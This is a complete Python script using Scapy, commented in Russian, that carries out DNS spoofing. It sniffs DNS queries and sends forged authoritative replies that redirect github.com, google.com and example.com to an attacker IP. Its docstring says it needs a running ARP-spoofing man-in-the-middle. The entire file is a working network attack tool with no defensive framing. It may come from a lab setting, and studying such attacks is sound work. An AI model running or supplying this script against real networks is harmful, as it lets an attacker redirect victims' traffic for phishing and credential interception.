#!/usr/bin/env python3
"""
DNS-spoofing.
Перехватывает DNS-запросы на интерфейсе и отвечает подменённым IP
для указанных доменов.

Требует работающего MITM (ARP-spoofing) — иначе запросы не пройдут через нас.
"""

from scapy.all import sniff, IP, UDP, DNS, DNSRR, send
import sys

# ===== НАСТРОЙКИ =====
IFACE = "eth0"              # интерфейс атакующего
SPOOF_IP = "172.16.1.50"    # IP, на который подменяем (наш)

# Домены, которые подменяем
DOMAINS = [
    "github.com",
    "google.com",
    "example.com",
]

# ===== ЛОГИКА =====
def handle_packet(pkt):
    """Обработчик DNS-запросов."""
    if not pkt.haslayer(DNS):
        return

    # Нас интересуют только DNS-запросы (qr=0)
    if pkt[DNS].qr != 0:
        return

    if not pkt.haslayer(IP):
        return

    qname = pkt[DNS].qd.qname.decode().rstrip(".")

    # Проверяем, подпадает ли домен под наши цели
    for dom in DOMAINS:
        if qname.endswith(dom):
            # Собираем поддельный ответ
            reply = (
                IP(dst=pkt[IP].src, src=pkt[IP].dst) /
                UDP(dport=pkt[UDP].sport, sport=53) /
                DNS(
                    id=pkt[DNS].id,
                    qr=1,        # ответ
                    aa=1,        # authoritative
                    qd=pkt[DNS].qd,
                    an=DNSRR(
                        rrname=pkt[DNS].qd.qname,
                        ttl=10,
                        rdata=SPOOF_IP
                    )
                )
            )
            send(reply, iface=IFACE, verbose=False)
            print(f"[+] Подменил: {qname} -> {SPOOF_IP}")
            return

def main():
    iface = sys.argv[1] if len(sys.argv) > 1 else IFACE

    print(f"[*] Слушаю DNS-запросы на {iface}...")
    print(f"[*] Подменяю домены: {DOMAINS}")
    print(f"[*] На IP: {SPOOF_IP}")
    print(f"[*] Ctrl+C для остановки\n")

    try:
        sniff(iface=iface, filter="udp port 53", prn=handle_packet, store=False)
    except KeyboardInterrupt:
        print("\n[*] Остановлено")
    except PermissionError:
        print("[!] Нужны права root: sudo python3 dns_spoof.py")
        sys.exit(1)

if __name__ == "__main__":
    main()
